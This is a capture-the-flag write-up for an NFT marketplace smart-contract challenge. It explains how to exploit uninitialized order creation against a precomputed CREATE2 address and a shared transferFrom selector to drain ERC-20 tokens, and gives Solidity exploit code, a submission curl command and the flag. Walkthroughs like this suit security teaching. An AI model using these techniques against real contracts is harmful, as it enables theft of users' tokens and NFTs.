# NFT Marketplace - Writeup
The goal of this challenge is to execute the `verify` function of the NFT marketplace and emit the `GetFlag` event.

To prevent the revert of the `verify` function of the NFT marketplace, the following three `require` statement conditions need to be satisfied.

```solidity
function verify() public {
    require(nmToken.balanceOf(address(this)) == 0, "failed");
    require(nmToken.balanceOf(msg.sender) > 1000000, "failed");
    require(
        rareNFT.ownerOf(1) == msg.sender && rareNFT.ownerOf(2) == msg.sender && rareNFT.ownerOf(3) == msg.sender
            && rareNFT.ownerOf(4) == msg.sender
    );
    emit GetFlag(true);
}
```

**Conditions:**
1. Reduce the NM Token balance of the NFT marketplace to `0`.
2. Make the NM Token balance of `msg.sender` greater than `1,000,000`.
3. Own all Rare NFTs with `tokenId` of `1`,`2`,`3`, and `4`. (Rare NFT 4 is already owned by msg.sender).

The following two vulnerabilities can be used to satisfy these conditions.
- Functions executable in an uninitialized state
- Transfer of ERC-20 tokens via `_safeTransferFrom` for ERC-721 tokens

### Functions executable in an uninitialized state
The `initialize` function of the NFT marketplace can be executed once at any time, and the `createOrder` function can be executed before that `initialize` function is executed.
The `_safeTransferFrom` function used in `createOrder` is implemented as follows.

```solidity
function _safeTransferFrom(address token, address from, address to, uint256 tokenId) internal {
    bool success;
    bytes memory data;

    assembly {
        // ... (see source for full assembly)
        let memPointer := mload(0x40)
        mstore(0, 0x23b872dd00000000000000000000000000000000000000000000000000000000)
        mstore(4, from) // append the 'from' argument
        mstore(36, to) // append the 'to' argument
        mstore(68, tokenId) // append the 'tokenId' argument

        success := and(
                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),
                call(gas(), token, 0, 0, 100, 0, 32)
            )
        // ...
    }
    if (!success) {
        revert TransferFromFailed();
    }
}
```

It uses the `call` opcode internally, but if the target address called by the `call` opcode is an EOA (Externally Owned Account) or a contract that hasn't been deployed yet (no code), the `call` always succeeds.
Any `createOrder` can be executed for any EOA or pre-calculated contract address without the actual Rare NFT transfer if it is done before the contract is deployed.

This vulnerability can be exploited to take away an NFT by performing the following steps:
1. Execute the `createOrder` function of an NFT you do not own to the address of the undeployed Rare NFT contract.
2. Execute the `initialize` function.
3. Execute the `cancelOrder` function for the order created in step 1.

The address of the Rare NFT contract can be pre-computed as follows because the `create2` opcode is used.

```solidity
library Create2 {
    function computeAddr(address creator, bytes32 salt, bytes memory bytecode, bytes memory encodedArgs) internal pure returns(address) {
        return address(uint160(uint256(keccak256(
            abi.encodePacked(bytes1(0xff), creator, salt, keccak256(abi.encodePacked(bytecode, encodedArgs)))
        ))));
    }
}
```

```solidity
// In Exploit.sol
address rareNFTAddress = Create2.computeAddr(
    address(nftMarketplace),
    keccak256("rareNFT"),
    nftMarketplace.getNFTVersion(),
    abi.encode("Rare NFT", "rareNFT")
);
```

The following code can take away Rare NFTs whose `tokenId` is `1`, `2`, and `3`.

```solidity
// Become the maker of orders for tokens that don't exist yet
uint256 orderId = nftMarketplace.createOrder(rareNFTAddress, 1, 0);
nftMarketplace.createOrder(rareNFTAddress, 2, 0);
nftMarketplace.createOrder(rareNFTAddress, 3, 0);

// Initialize (deploys contracts)
nftMarketplace.initialize();

// Cancel orders to retrieve the tokens
nftMarketplace.cancelOrder(orderId);
nftMarketplace.cancelOrder(orderId + 1);
nftMarketplace.cancelOrder(orderId + 2);
```

### Transfer of ERC-20 tokens via `safeTransferFrom` for ERC-721 tokens

To take away the NM Token, an ERC-20 token, use the `fulfillTest` function.

```solidity
function fulfillTest(address token, uint256 tokenId, uint256 price) public {
    require(!tested, "Tested");
    tested = true;
    uint256 orderId = NFTMarketplace(this).createOrder(token, tokenId, price);
    fulfill(orderId); // Calls _safeTransferFrom internally
}
```

This function can be exploited by setting `token` to the address of the NM Token (ERC20) and `tokenId` to the amount we want to steal (`1,000,000`).
When `fulfill(orderId)` is called, it executes:
- `_safeTransferFrom(<nmToken address>, <nftMarketplace address>, <player address>, 1000000);`

In the `_safeTransferFrom` function, the function signature is `_transferFrom(address,address,uint256)` (selector `0x23b872dd`).

```sh
$ cast 4 0x23b872dd
transferFrom(address,address,uint256)
```

This selector matches both ERC-721 and ERC-20 `transferFrom` functions.

**ERC-721 signature:** `transferFrom(address from, address to, uint256 tokenId)`
**ERC-20 signature:** `transferFrom(address from, address to, uint256 amount)`

Since the function selector collision exists, the ERC-20 contract accepts the call, interpreting the third argument as `amount` instead of `tokenId`.
Therefore, all the NM Tokens that the NFT marketplace holds can be transferred to the attacker.

### Execution

The following command runs the exploit locally:

```bash
# Ensure local/ctf server is running or contact ctf organizers. (see HOSTING.md)
./exploit.sh
```

Which executes something similar to:
```bash
BYTECODE=$(forge inspect src/solution/Exploit.sol:Exploit bytecode)
curl -v http://nftcrshout.breachpoint.live/exploit -X POST --header "Content-Type: application/json" -d "{\"bytecode\": \"$BYTECODE\"}"
```

**Flag:** `bpctf{blockthechain_is_fun}`
